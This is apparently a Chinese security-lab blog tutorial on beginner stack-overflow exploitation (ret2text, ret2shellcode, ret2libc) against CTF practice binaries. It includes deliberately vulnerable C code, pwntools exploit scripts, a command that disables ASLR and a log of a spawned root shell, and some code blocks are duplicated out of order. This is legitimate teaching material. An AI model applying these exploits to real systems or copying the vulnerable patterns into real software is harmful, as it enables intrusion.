<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GKHjgmdNu70byyPoBxQZGA)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnoJ5EbQBrCIuia7elLCaDEFsmP8TibJSbV069k6ibW47qlPibN0jeKXp5lQ/640?wx_fmt=jpeg)

Leishi

Security

 Lab

 PWN - 栈溢出入门 

溢出 padding 计算

**方法 1：esp/ebp 距离计算**

1. 溢出函数处下断点

b main

2. 记录 esp、ebp

EBP: 0xbffff508 --> 0x0

ESP: 0xbffff480 --> 0x0

3. 找到溢出函数参数位置

0x804858c <main+95>: lea    eax,[esp+0x1c]

4. padding = (ebp - (esp+1c)) + 4 = (0xbffff508 - 0xbffff480 - 0x1c ) +4 = 112

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnGgnZtf5evE5x6Brj9KpZoKMqxEB9zOrUtYVIl53Jb4rbe5qD9ff5tQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7gtTg0Pz11PFtdmkUDsdDs5GDqRvB5JWX4Bhf5Z2uEPRswjKGAMB9A/640?wx_fmt=png)

**方法 2：pattern_create**

通常情况下 ebp + 4/rbp + 8 更准确

pattern_offset $ebp

pattern_offset $eip

pattern_offset $rbp

pattern_offset $rip

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7tGiboFy5UXFvmV0Gpf0E26oKT5E9WY0mD4X0Zlm3o9LFaKTViazPkvQ/640?wx_fmt=png)

**方法 3：cyclic**

```
┌──(root💀kali)-[/home/kali/Desktop/CTF]└─# cyclic 200                                                                                                                                                                                                                     148 ⨯ 1 ⚙[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab                                                                                                                                                                                                                                             ┌──(root💀kali)-[/home/kali/Desktop/CTF]└─# gdb ret2shellcode                                                                                                                                                                                                                    1 ⚙gdb-peda$ runStarting program: /home/kali/Desktop/CTF/ret2shellcode No system for you this time !!!aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabbye bye ~Program received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0x9 ('\t')EDX: 0xffffffff ESI: 0xb7fb0000 --> 0x1e4d6c EDI: 0xb7fb0000 --> 0x1e4d6c EBP: 0x62616163 ('caab')ESP: 0xbffff510 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")EIP: 0x62616164 ('daab')EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x62616164Legend: code, data, rodata, valueStopped reason: SIGSEGV0x62616164 in ?? ()gdb-peda$ zsh: suspended  gdb ret2shellcode                                                                                                                                                                                                                                             ┌──(root💀kali)-[/home/kali/Desktop/CTF]└─# cyclic -l "0x62616164"                                                                                                                                                                                                         148 ⨯ 2 ⚙[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.112
```

  

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnjcHQy17XpHTzJbH018ugbev7FQwPpOaVnZQ6pv3wjcm6DAGdYg0bhA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnQBXwrF39NCibezLH9Mibk2LEOIMXDH7iaEZYbzEJsP90uNhYarnL7oJEQ/640?wx_fmt=png)

**栈溢出利用**

**ret2text**

ret2text 即控制程序执行程序本身已有的的代码 (.text)

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnGWXoNgvNGxOB9hIPH4BsojQ6P76xDdkH8Yn2A5xqlzzgw0Um9EZia9A/640?wx_fmt=png)

示例

```
// gcc -m32 -fno-stack-protector -no-pie ret2text.c -o ret2text#include <stdio.h>#include <string.h>void success() {    puts("SUCCESS!!!");    system("cat flag");}void vulnerable() {  char s[12];  gets(s);  puts(s);  return;}int main(int argc, char **argv) {  vulnerable();  return 0;}
```

.text 段存在 flag 关键信息函数

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnJuSrYZKwvGKVfwOp3YXtIAXRJEVHN67NgxndaNf6vscwyekzEYrVzw/640?wx_fmt=png)

计算溢出长度

xxxxx

python 代码

from pwn import *

sh = process("./ret2text")

win = 0x8049182

sh.sendline(b'A'*24 + p32(win))

sh.interactive()

**ret2shellcode**

图 1

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnp3iatxSVT2nPmSshtQQANSf5C1DSwdg9ldFmm3AHEOoXmauD2qvdLrg/640?wx_fmt=png)

图 2

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnlbcQ1HBicrMKfADrWwFnawS2K9RlnxAdMHxUbibzf866jQjWtDtfhwyA/640?wx_fmt=png)

问题：如何确定 shellcode 起始地址

关闭 ASLR

ASLR(系统开启的)

ASLR 是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。

在 linux 中使用此技术后，杀死某程序后重新开启，地址换。

在 windows 中使用此技术后，杀死进程后重新开启，地址不换，重启才会改变。

以上 cat 命令输出的值表示：

0 - 表示关闭进程地址空间随机化。

1 - 表示将 mmap 的基址，stack 和 vdso 页面随机化。

2 - 表示在 1 的基础上增加栈（heap）的随机化。

echo 0 > /proc/sys/kernel/randomize_va_space

echo 1 > /proc/sys/kernel/core_uses_pid

示例

#include <unistd.h>

void vuln_func()

{

        char buf[128];

        read(STDIN_FILENO,buf,256);

}

int main(void)

{

        vuln_func();

        write(STDOUT_FILENO,"hello world!\n",13);

}

1. 执行溢出确定溢出地址和 core 文件

为什么是 $esp-140-4 因为此时的 esp 指向函数返回地址

函数是执行 ret 之后才报错的，所以此时代码已经执行完成 ret，也就是说 esp 指向（返回地址 + 4）

```
└─# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 ⚙

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2936]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp-140-4

0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389

gdb-peda$

zsh: suspended  gdb stack3 core.2936 -q



#!/usr/bin/env python

from pwn import *



sh = process('./stack3')



# 方法1

shellcode = asm(shellcraft.sh())

buf2_addr = 0xbffff4c0

print(shellcode)

pause()

sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )

sh.interactive()┌──(root�kali)-[/home/kali/Desktop/CTF]

└─# gdb stack3 core.2936 -q                                                                                                                                                                                                             1 ⚙

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2936]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp-140-4

0xbffff4c0:     0x2f68686a      0x68732f2f      0x6e69622f      0x0168e389

gdb-peda$

zsh: suspended  gdb stack3 core.2936 -q



#!/usr/bin/env python

from pwn import *



sh = process('./stack3')



# 方法1

shellcode = asm(shellcraft.sh())

buf2_addr = 0xbffff4c0

print(shellcode)

pause()

sh.sendline(shellcode + b'B'*(140-len(shellcode)) + p32(buf2_addr) )

sh.interactive()
// gcc -m32 -fno-stack-protector -no-pie ret2text.c -o ret2text

#include <stdio.h>

#include <string.h>



void success() {

    puts("SUCCESS!!!");

    system("cat flag");

}



void vulnerable() {

  char s[12];

  gets(s);

  puts(s);

  return;

}



int main(int argc, char **argv) {

  vulnerable();

  return 0;

}
```

方法 2：

```
└─# gdb stack3 core.2961 -q                                                                                                                                                                                                             6 ⚙

Reading symbols from stack3...

(No debugging symbols found in stack3)

[New LWP 2961]

Core was generated by `./stack3'.

Program terminated with signal SIGSEGV, Segmentation fault.

#0  0xbf91afc0 in ?? ()

gdb-peda$ x/4wx $esp

0xbffff550:     0xbffff50a      0x00000000      0x00000000      0xb7de9e46

gdb-peda$







#!/usr/bin/env python

from pwn import *



sh = process('./stack3')

# 方法2

buf2_addr = 0xbffff550 # 就是esp的值

print(shellcode)

pause()

sh.sendline(b'b'*140+ p32(buf2_addr)  + shellcode)

sh.interactive()





┌──(root�kali)-[/home/kali/Desktop/CTF]

└─# python3 stack3.py                                                                                                                                                                                                                   3 ⚙

[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.

[+] Starting local process './stack3': pid 3037

b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

[*] Switching to interactive mode

$ id

uid=0(root) gid=0(root) groups=0(root),143(kaboxer)

$

[*] Interrupted

[*] Stopped process './stack3' (pid 3037)
```

**ret2libc**

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnjXurcqia1Sx1xCVyS6kI8mRBNtqkcozAIMNQW2mPHrVFGgfOQibyvJpw/640?wx_fmt=png)

例 1

IDA 分析

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn99UwXOFN9EdiarznSvaxUDwhs4iciaBnLk6fg7d4Ckcic4WWLMDs1dXKBA/640?wx_fmt=png)

sh_addr = 0x08048720

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnKUFXbGhiarLlNDLwAttKO2zLRGeaSictrxibbwxc3IxzYz32gO82b2ukg/640?wx_fmt=png)

system_addr = 0x08048460

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnFSdSJfnGhUdbhqDRskW670oT0dBL3d6o8ZtGIx8uTFyKDpGQrEDrrw/640?wx_fmt=png)

padding = 112

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7SuImVbnTePmbp8gssCibBmt7uybJoMWwslRjGnUZLOjIM75ZBQicV5A/640?wx_fmt=png)

exp

from pwn import *

sh = process("./ret2libc1")

binsh = 0x08048720

system_plt = 0x08048460

whatever_addr = 0x11111111

payload = b"a" * 112

payload += p32(system_plt)

payload += p32(whatever_addr)# 这里就是调用 system 的返回地址，没有实际意义

payload += p32(binsh)

sh.sendline(payload)

sh.interactive()

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnD8kpXia0nMeL9Ayicj4XPNd3kRHZ9rlfXEl7rkUBHg7JicYwtex6DxCYg/640?wx_fmt=png)

例 2

checksec

xxxxx

计算 padding = 112

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnXOZPeVx6es6suwebRS8ZoL8WP0mwqX9ibiaoBShpribq26qUL6XnSvVkQ/640?wx_fmt=png)

.bss buf2 = 0x0804A080

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnfk7Ofm7XGzn2Mj7cib0WDsxZ5R1skPpdTrPQib4NKYHrSh6uD2AVLF9w/640?wx_fmt=png)

gets = 08048460

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnvoDggicE35hGia9bH1cnJvoJ62H7icctajR43hkDvOCNpZ3pLWjl1Qyicg/640?wx_fmt=png)

system = 08048490

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn06zt3OEicsr4kE5oOTV9ABPmnMlUSXFrRRGvcFudcKnXtowjibEfXRUw/640?wx_fmt=png)

栈情况分析

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnD2G5eQvClZiaKia3JicU0UOUviaCcjoJeD5ckgQ04OrLVpUoADzf2dpjOg/640?wx_fmt=png)

exp

from pwn import *

sh = process("./ret2libc2")

get_addr = 0x08048460

buf_addr = 0x0804A080

system_addr = 0x08048490

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

sh.sendline(payload)

sh.sendline("/bin/sh")

sh.interactive()

exp2

from pwn import *

sh = process("./ret2libc2")

elf = ELF("./ret2libc2")

get_addr = elf.plt['gets']

system_addr = elf.plt['system']

buf_addr = elf.symbols['buf2']

payload = b"Q" * 112

payload += p32(get_addr)

payload += p32(system_addr)

payload += p32(buf_addr)

payload += p32(buf_addr)

sh.sendline(payload)

sh.sendline("/bin/sh")

sh.interactive()

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mntQCqRPnm3MibrGHnyDmHqD7MIsuDbS7RmvgHAlbkwS4AfukU2obp3AA/640?wx_fmt=png)

例 3

函数基址 base = A 函数 got - A 函数 libc = B 函数 got - B 函数 libc

xctf level3

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnZLiaWEoj3wIaRy0z817N1OSthsG6q8fM9GeibgSnn0WTgVmntftpREuA/640?wx_fmt=png)

libc_write = 0x000D43C0

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mn7K6UOvPkl03ibmXe42kGnZfPfAGnKoHzoGWJI8tQFMJQXqu8dRLg1PQ/640?wx_fmt=png)

libc_system = 0x0003A940

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnniaKiczrjzY2l3Scb3etONYYiaJAU975eMCvXSVJqPUsJzcov3e0gzraw/640?wx_fmt=png)

libc_bin = 0x0015902B

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mntXTZyKawyyoAiaoLFaNZ7mB4RdibriazB5mWcpHrxlGD2uyDaumzW2iaQQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mnCib3GbRG7r7CV97M3DzBRiaeibXVNFYAfEYOuuCnS2vr2cQkMjDHsB0bw/640?wx_fmt=png)

2021

**LEISHI**

**SECURITY**

![图片](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08ia4MhA05iaKSwJdaHp8U6mniajChzpiaSgKV7RTAibCicPkJeIBpqhicNw0ohOpVZpvLI5KPDSwCjKO24w/640?wx_fmt=png)

**LEISHI**////**ARRIVAL**

长按关注

雷石安全实验室